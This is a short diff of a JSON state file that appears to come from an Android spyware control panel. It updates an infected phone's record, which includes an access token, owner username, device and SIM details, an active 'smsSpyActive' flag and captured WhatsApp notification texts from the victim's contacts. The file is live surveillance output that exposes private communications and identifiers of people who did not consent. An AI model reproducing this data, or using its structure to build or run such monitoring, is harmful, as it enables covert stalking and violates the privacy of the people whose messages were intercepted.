@@ -108,14 +108,14 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003799666,
+    "lastSeen": 1776003806069,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
     "deviceInfo": {
       "model": "vivo vivo 1938",
       "androidVersion": "Android 12",
-      "battery": 43,
+      "battery": 44,
       "network": "WiFi: Nima",
       "sim1": "XL Axiata",
       "sim2": "XL Axiata"
@@ -124,6 +124,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (40 pesan): ~ zaa?",
+        "content": "💟 Stiker",
+        "time": "12/04 21:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003807395
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
@@ -4115,14 +4123,6 @@
         "time": "12/04 12:07",
         "pkg": "com.whatsapp",
         "receivedAt": 1775970463425
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝐑𝐀𝐑 𝐎𝐏𝐌𝐄𝐌",
-        "content": "~ a֟waa୨ৎ: brapa yh",
-        "time": "12/04 12:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775970438669
       }
     ],
     "galleryPhotos": [],
